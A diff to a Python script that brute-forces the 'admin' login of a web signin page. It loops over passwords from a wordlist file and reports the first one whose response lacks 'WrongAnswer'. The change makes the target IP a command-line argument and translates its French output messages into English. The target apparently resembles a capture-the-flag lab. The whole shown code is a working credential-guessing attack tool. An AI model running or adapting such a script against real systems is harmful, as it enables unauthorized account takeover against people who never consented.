@@ -1,6 +1,13 @@
 import subprocess
+import sys
 
-url = "http://10.13.248.4/?page=signin"
+
+if len( sys.argv ) == 2:
+    url = f"http://{sys.argv[1]}/?page=signin"
+else:
+    print("Error: please set the IP address in the script parameter")
+    exit(1)
+
 username = "admin"
 
 with open("passwords.txt", "r") as f:
@@ -18,9 +25,9 @@ with open("passwords.txt", "r") as f:
         print(f"[ ] Test : {pwd}")
 
         if "WrongAnswer" not in output:
-            print("\n=== MOT DE PASSE TROUVÉ ===")
+            print("\n=== PASSWORD FOUND ===")
             print(f"username = {username}")
             print(f"password = {pwd}")
             break
     else:
-        print("Aucun mot de passe trouvé.")
+        print("No password found")
